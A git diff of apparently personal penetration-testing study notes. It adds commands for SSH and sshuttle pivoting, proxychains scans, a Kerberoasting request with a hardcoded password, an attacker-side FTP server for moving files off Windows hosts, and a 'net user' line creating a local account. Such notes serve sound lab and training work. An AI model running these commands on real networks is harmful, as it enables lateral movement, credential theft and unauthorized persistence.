@@ -224,6 +224,15 @@ use the following website for the rainbow table attack
 -     ssh -D <PortThatUWillBeListeningFrom ex.8080> raman@<Machine that can access the website>
 -     then go to firefox --> proxy --> choose manual proxy --> set SOCKS Host to 127.0.0.1 & Port 8080
 
+------------------------------------------------------------------------------Pivoting--------------------------------------------------------------------------------
+pivot another machine using ssh
+-     ssh -f -N -D <PORT that in the procxychaine file> -i pivot raman@<IP Machine2>
+after pivoting u can run different commands like
+-     proxychaines nmap -p88 <IP> -sT
+-     proxychaines GetUserSPNs.py raman.local/machine2:Ab2002.. -dc-ip 10.0.2.19 -request
+pivoting using sshuttle
+-     sshuttle -r raman@<targetIP> <TargetNetwork/CIDR> --ssh-cmd "ssh -i pivot"   (now u can run the commands without proxychains)
+chisel     (check this tool as it's good)
 -----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
 - https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
@@ -286,6 +295,11 @@ add Find-AllVulns in the last line
 - if SSH is running on the system use the found credentials to login
 
 **keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
+transferring a file in windows using pyftpdlib
+-     python -m pyftpdlib 21 (attacker machine)
+-     ftp 10.0.2.10
+Add a user
+-     net user raman to0or /add
 
 1- Escalation Path - Kernel Exploitation
 here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-kernel-exploits
@@ -407,7 +421,7 @@ net localgroup administrator
 run powerup and check service executables
 you also can check executable services from the cmd command
 -     C:\Users\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"     (executable service)
-now you need to download a file from windows to kali. use ftp server to do that
+now you need to download a file from Windows to kali. use ftp server to do that
 -     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
 head to C:\Tools\Source and connect to kali ftp server, anonymous login, then put the windows_service.c file
 -     ftp 10.10.16.4 | username:anonymous | put windows_service.c
